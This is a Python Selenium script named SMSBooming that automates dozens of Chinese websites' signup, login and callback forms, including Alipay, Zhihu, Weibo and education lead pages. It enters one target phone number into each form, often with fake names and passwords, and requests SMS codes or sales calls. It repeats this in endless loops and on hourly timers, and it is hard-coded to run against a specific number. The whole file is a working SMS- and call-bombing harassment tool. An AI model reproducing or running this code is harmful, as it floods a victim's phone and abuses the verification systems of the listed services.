import time
from random import choice
from datetime import datetime
from multiprocessing import Process
from selenium import webdriver
from selenium.webdriver.common.by import By


class SMSBooming:

    names = ['李先生', '王女士', '赵先生', '刘先生']
    passwords = ['aiahdia6', 'akahoaw1', 'akxhk8as', 'ahfaxh0q']

    def __init__(self, phone_number):
        self.phone = phone_number

    def create_driver(self):
        options = webdriver.FirefoxOptions()
        # options.add_argument('--headless')
        driver = webdriver.Firefox(options=options)
        driver.set_page_load_timeout(10)
        return driver

    def request(self, d, url):
        try:
            d.get(url)
        except:
            try:
                d.execute_script('window.stop()')
            except:
                pass

    def boom(self, driver, platform):
        self.request(driver, platform['url'])
        name, password = platform.get('name'), platform.get('password')
        phone, verify = platform['phone'], platform['register']
        password_confirm = platform.get('password_confirm')
        _password = choice(self.passwords)
        try:
            if name is not None:
                driver.find_element(
                    name[0], name[1]).send_keys(choice(self.names))
            time.sleep(1)
            driver.find_element(phone[0], phone[1]).send_keys(self.phone[:3])
            time.sleep(1)
            driver.find_element(phone[0], phone[1]).send_keys(self.phone[3:7])
            time.sleep(1)
            driver.find_element(phone[0], phone[1]).send_keys(self.phone[7:])
            if password is not None:
                driver.find_element(password[0], password[1]).send_keys(
                    _password)
            if password_confirm is not None:
                driver.find_element(password_confirm[0],
                                    password_confirm[1]).send_keys(_password)
            driver.find_element(verify[0], verify[1]).click()
        except:
            pass

    def timer(self, start_time, platform):
        sleep = False
        while True:
            if datetime.now().hour != start_time or sleep is True:
                time.sleep(60 * 60)
                sleep = False
                continue
            driver = self.create_driver()
            for tel in platform:
                self.boom(driver, tel)
                time.sleep(5)
            driver.close()
            sleep = True

    def run_telephone(self):
        """10点开刷　刷一次"""
        self.timer(10, telephone)

    def run_daily(self):
        self.timer(12, daily)

    def run_constantly(self):
        while True:
            driver = self.create_driver()
            for platform in constantly:
                self.boom(driver, platform)
                time.sleep(10)
            driver.close()

    def run_special(self):
        websites = [
            self.bdgcw, self.xinlei_register, self.xinlei_login,
            self.pass_17173, self.music_163, self.jiayuan, self.cnmo, self.fkw,
            self.pptv, self.a5, self.alipay, self.baixing, self.iqiyi,
            self.douban, self.liuxue51
        ]
        while True:
            driver = self.create_driver()
            for website in websites:
                try:
                    website(driver)
                except:
                    pass
                time.sleep(10)
            driver.close()

    def run(self):
        # p1 = Process(target=self.run_constantly)
        # p2 = Process(target=self.run_daily)
        # p3 = Process(target=self.run_telephone)
        p4 = Process(target=self.run_special)
        # p1.start()
        # p2.start()
        # p3.start()
        p4.start()
    #
    # def bfsu(self, driver):
    #     self.request(driver, 'https://liuxue.bfsu.edu.cn/apply/index.php/welcome')
    #     driver.switch_to.alert().accept()
    #     driver.find_element_by_name('name').send_keys(choice(self.names))
    #     driver.find_element_by_name('phone').send_keys(self.phone)
    #     driver.find_element_by_id('sendEmail').click()

    def bdgcw(self, driver):
        self.request(driver, 'http://wuhan.bdcgw.cn/pctg/2345/2961/?A')
        driver.find_element_by_xpath('//input[@id="gp"]').send_keys(choice(['601258', '300370', '601952', '603728']))
        driver.find_element_by_xpath('//input[@name="tgMobile1"]').send_keys(self.phone)
        driver.find_element_by_id('btnTg1').click()

    def cnmo(self, driver):
        self.request(driver, 'http://passport.cnmo.com/register/')
        driver.find_element_by_xpath('//input[@id="m_mobile"]').send_keys(self.phone)
        driver.find_element_by_xpath('//input[@id="m_uname"]').send_keys('aoiwfhoqwfnckj')
        driver.find_element_by_xpath('//input[@id="m_password"]').send_keys('123qwe123')
        driver.find_element_by_xpath('//input[@id="m_confirm"]').send_keys('123qwe123')
        driver.find_element_by_xpath('//input[@id="m_getcode"]').click()

    def xinlei_login(self, driver):
        self.request(driver, 'http://i.xunlei.com/login.html')
        driver.switch_to.frame('loginIframe')
        driver.find_element_by_id('ml_tab').click()
        time.sleep(0.5)
        driver.find_element_by_xpath('//input[@id="ml_m"]').send_keys(self.phone)
        driver.find_element_by_id('ml_gc').click()

    def xinlei_register(self, driver):
        self.request(driver, 'http://i.xunlei.com/login.html')
        driver.switch_to.frame('loginIframe')
        driver.find_element_by_id('turnRegister').click()
        time.sleep(0.5)
        driver.find_element_by_xpath('//input[@id="pr_m"]').send_keys(self.phone)
        driver.find_element_by_id('pr_gc').click()

    def fkw(self, driver):
        self.request(driver, 'http://jz.fkw.com/reg.html')
        driver.switch_to.frame('regIframe')
        driver.find_element_by_xpath('//input[@id="regAcct"]').send_keys(self.phone)
        driver.find_element_by_class_name('item_coed').click()

    def jiayuan(self, driver):
        self.request(driver, 'http://reg.jiayuan.com/signup/fillbasic.php')
        driver.find_element_by_id('phoneNumber').send_keys(self.phone)
        driver.find_element_by_id('mobile_vali').send_keys(self.phone[:4])
        time.sleep(0.5)
        driver.find_element_by_xpath('//a[@id="get"]').click()

    def music_163(self, driver):
        self.request(driver, 'http://music.163.com/#/login')
        driver.execute_script('top.reg();return false;')
        time.sleep(0.5)
        driver.find_element_by_class_name('j-phone').send_keys(self.phone)
        driver.find_element_by_class_name('j-pwd').send_keys(choice(self.passwords))
        driver.find_element_by_class_name('j-btn').click()

    def pass_17173(self, driver):
        self.request(driver, 'https://passport.17173.com/register')
        driver.find_element_by_link_text('手机注册').click()
        driver.find_element_by_xpath('//input[contains(@class, "input-passport valid")]').send_keys(self.phone)
        driver.find_element_by_xpath('//input[contains(@class, "input-pw valid")]').send_keys(choice(self.passwords))
        driver.find_element_by_class_name('get-captcha').click()

    def pptv(self, driver):
        self.request(driver, 'http://www.pptv.com/')
        driver.find_element_by_id('user_register_tj').click()
        time.sleep(1)
        driver.switch_to.frame('iframeLogin')
        phone = driver.find_element_by_xpath('//form[@id="isPCSite"]/ul/li/input')
        phone.send_keys(self.phone[:5])
        time.sleep(1)
        phone.send_keys(self.phone[5:])
        driver.find_element_by_class_name('get-verify-code').click()

    # def iqiyi(self, driver):
    #     self.request(driver, 'http://vip.iqiyi.com/')
    #     driver.find_element_by_class_name('j_vip_reg').click()
    #     time.sleep(1)
    #     driver.switch_to.frame('login_frame')
    #     driver.find_element_by_class_name('txt-account').send_keys(self.phone)
    #     driver.find_element_by_link_text('注册').click()

    def baixing(self, driver):
        self.request(driver, 'http://www.baixing.com/oz/verify/reg')
        driver.find_element_by_link_text('手机号码注册').click()
        time.sleep(1)
        driver.find_element_by_xpath('//div[@class="publish-detail-item"]/input').send_keys(self.phone)
        driver.find_element_by_xpath('//p[@class="p-submit"]/button').click()

    def a5(self, driver):
        self.request(driver, 'https://www.a5.net/member.php?mod=register')
        driver.execute_script("$('agreebbrule').checked = true;hideMenu('fwin_dialog', 'dialog');")
        time.sleep(1)
        driver.find_element_by_id('mobile').send_keys(self.phone)
        driver.execute_script("showWindow('mcode', 'plugin.php?id=bischina_captcha:msmscode&mobile='+$('mobile').value,'get',0);")

    def douban(self, driver):
        self.request(driver, 'https://accounts.douban.com/register')
        driver.find_element_by_xpath('//div[@class="agreement-btns"]/a').click()
        time.sleep(1)
        driver.find_element_by_id('verify_phone_num').send_keys(self.phone)
        driver.find_element_by_id('request-phone-code-btn').click()

    def liuxue51(self, driver):
        self.request(driver, 'http://www.liuxue51.net/user/register')
        driver.find_element_by_id('UbLoginName').send_keys(self.phone)
        driver.find_element_by_id('UbPassword').send_keys('123qwe123')
        driver.find_element_by_id('UbPasswordRepeat').send_keys('123qwe123')
        driver.find_element_by_id('UbType1').click()
        driver.execute_script('sendMessage()')

    def alipay(self, driver):
        self.request(driver, 'https://memberprod.alipay.com/account/reg/index.htm')
        iframe = 'dialog-iframe' + str(int(time.time() * 1000))
        driver.switch_to.frame(iframe)
        driver.find_element_by_class_name('J-agree-button').click()
        time.sleep(1)
        driver.find_element_by_id('J-accName').send_keys(self.phone)
        driver.find_element_by_id('J-mobCode').send_keys('1')
        driver.find_element_by_link_text('获取验证码').click()

    def iqiyi(self, driver):
        self.request(driver, 'http://www.iqiyi.com/iframe/loginreg?is_reg=1')
        driver.find_element_by_class_name('txt-account').click()
        driver.find_element_by_class_name('txt-account').send_keys(self.phone)
        driver.find_element_by_link_text('注册').click()


constantly = [
    {
        'url': 'https://om.qq.com/userReg/register?mediaType=1',
        'phone': (By.ID, 'phone'),
        'register': (By.CLASS_NAME, 'getAuthCode')
    },
    {
        'url': 'https://account.wps.cn/v1/signup',
        'phone': (By.ID, 'phone'),
        'password': (By.ID, 'phone_password'),
        'register': (By.ID, 'signupPhone')
    },
    {
        'url': 'http://passport.soufun.com/register.aspx',
        'phone': (By.ID, 'strMobile'),
        'register': (By.XPATH, '//input[@id="vcode"]')
    },
    {
        'url': 'http://www.wanke001.com/Register/Register.aspx',
        'phone': (By.ID, 'txtMobile'),
        'register': (By.ID, 'sendCode')
    },
    {
        'url': 'https://my.22.cn/register.html',
        'phone': (By.XPATH, '//input[@id="iphoneCode"]'),
        'register': (By.XPATH, '//input[@id="iphone-code-get"]'),
    },
    {
        'url': 'https://account.youku.com/register.htm',
        'phone': (By.ID, 'passport'),
        'password': (By.ID, 'password'),
        'password_confirm': (By.ID, 'repeatPsd'),
        'register': (By.ID, 'getMobileCode')
    },
    {
        'url': 'https://www.zhihu.com/signup',
        'phone': (By.NAME, 'phoneNo'),
        'register': (By.CLASS_NAME, 'SignFlow-smsInputButton')
    },
]

telephone = [
    {
        'url': 'http://www.taisha.org/',
        'phone': (By.XPATH, '//input[@class="lxb-cb-input"]'),
        'register': (By.XPATH, '//input[@class="lxb-cb-input-btn"]')
    },
    {
        'url': 'http://www.xinquanedu.com/zt/2017/xinquan/',
        'phone': (By.XPATH, '//input[@class="lxb-cb-input"]'),
        'register': (By.XPATH, '//input[@class="lxb-cb-input-btn"]')
    },
    {
        'url': 'http://sg.ivygate.info/',
        'phone': (By.XPATH, '//input[@class="lxb-cb-input"]'),
        'register': (By.XPATH, '//input[@class="lxb-cb-input-btn"]')
    },
    {
        'url': 'https://www.liuxue86.com/',
        'phone': (By.XPATH, '//form[@class="guestbook-fixed"]/input'),
        'register': (By.XPATH, '//form[@class="guestbook-fixed"]/button')
    },
    {
        'url': 'http://lp.liuxue.com/usa/hot/home/#/',
        'phone': (By.XPATH, '//input[@class="lxb-cb-input"]'),
        'register': (By.XPATH, '//input[@class="lxb-cb-input-btn"]')
    },
    {
        'url': 'http://liuxue.xdf.cn/',
        'phone': (By.ID, 'stu_Phone'),
        'name': (By.ID, 'stu_Name'),
        'register': (By.ID, 'dosubmit')
    },
    {
        'url': 'http://liuxue.shciic.com/',
        'name': (By.NAME, 'UserName'),
        'phone': (By.NAME, 'Phone'),
        'register': (By.XPATH, '//form[@id="submitform"]/div/input')
    },
    {
        'url': 'http://liuxue.fm/',
        'phone': (By.XPATH, '//input[@class="lxb-cb-input"]'),
        'register': (By.XPATH, '//input[@class="lxb-cb-input-btn"]')
    },
    {
        'url': 'http://yingguo.liuxue86.com/',
        'name': (By.NAME, 'uname'),
        'phone': (By.NAME, 'telephone'),
        'register': (By.CLASS_NAME, 'btn-assertive')
    },
    {
        'url': 'http://xa.jiajiaoban.cn/pc/izk/index.html',
        'phone': (By.ID, 'studentname2'),
        'name': (By.ID, 'mobilephone2'),
        'register': (By.CLASS_NAME, 'xes-btn1')
    },
    {
        'url': 'http://xa.zgjhjy.com/',
        'name': (By.ID, 'name'),
        'phone': (By.ID, 'phone'),
        'register': (By.ID, 'btn')
    },
    {
        'url': 'http://ruishi.liuxue86.com/',
        'name': (By.NAME, 'uname'),
        'phone': (By.NAME, 'telephone'),
        'register': (By.CLASS_NAME, 'btn-assertive')
    },
]

daily = [
    {
        'url': 'http://www.zhangmen.com/lp/sem',
        'name': (By.ID, 's-name'),
        'phone': (By.ID, 'stu_mobile1'),
        'register': (By.ID, 'pcheaderbtn2')
    },
    {
        'url': 'https://passport.yhd.com/passport/register_input.do',
        'phone': (By.XPATH, '//input[@class="phone"]'),
        'password': (By.XPATH, '//input[@class="validPhoneCode"]'),
        'register': (By.CLASS_NAME, 'r_require_code')
    },
    {
        'url': 'http://longmenedu.com.cn/baoming.asp',
        'name': (By.NAME, 'UserName'),
        'phone': (By.NAME, 'Mtel'),
        'register': (By.NAME, 'Submit')
    },
    {
        'url': 'http://www.xascedu.com/',
        'name': (By.XPATH, '//input[@id="msgLeft_senderName"]'),
        'phone': (By.XPATH, '//input[@id="msgLeft_telephone"]'),
        'register': (By.XPATH, '//img[@id="msgLeft_Btn"]')
    },
    {
        'url': 'https://h5.ele.me/login/',
        'phone': (By.XPATH, '//section[@class="MessageLogin-FsPlX"]/input'),
        'register': (By.XPATH, '//section[@class="MessageLogin-FsPlX"]/button')
    },
    {
        'url': 'https://passport.womai.com/register/redirect.do',
        'phone': (By.XPATH, '//input[@id="Email"]'),
        'name': (By.XPATH, '//input[@id="loginId"]'),
        'password': (By.XPATH, '//input[@id="password"]'),
        'password_confirm': (By.XPATH, '//input[@id="password2"]'),
        'register': (By.XPATH, '//input[@id="validBtn"]')
    },
    {
        'url': 'https://login.zbj.com/register',
        'phone': (By.ID, 'sacc'),
        'register': (By.CLASS_NAME, 'btn-get-code')
    },
    {
        'url': 'http://zt.epwk.com/',
        'name': (By.ID, 'username'),
        'phone': (By.ID, 'mobile'),
        'register': (By.CLASS_NAME, 'button')
    },
    {
        'url': 'http://zt.epwk.com/1607epzhelu/',
        'phone': (By.ID, 'mobile2'),
        'register': (By.ID, 'verify2')
    },
    {
        'url': 'https://weibo.com/signup/signup.php',
        'phone': (By.NAME, 'username'),
        'password': (By.NAME, 'passwd'),
        'register': (By.CLASS_NAME, 'W_btn_e')
    },
    {
        'url': 'http://www.zhixue.com/container/reg/parent/reg',
        'phone': (By.ID, 'reg_txtMobile'),
        'password': (By.ID, 'reg_txtPwd'),
        'register': (By.ID, 'reg_btnCode')
    },
]

special = [
    # 获取不到
    {
        'url': 'http://www.lofter.com/phoneAccount/register',
        'phone': (By.XPATH, '//input[@id="phone-num"]'),
        'register': (By.LINK_TEXT, '获取验证码')
    },
    # 请求不到
    {
        'url': 'http://www.888v666.com/zzsq/',
        'phone': (By.XPATH, '//input[@id="mobile"]'),
        'register': (By.XPATH, '//span[@class="item_code"]')
    },

    # TODO: https://memberprod.alipay.com/account/reg/index.htm
]


if __name__ == '__main__':
    SMSBooming('13909188482').run()
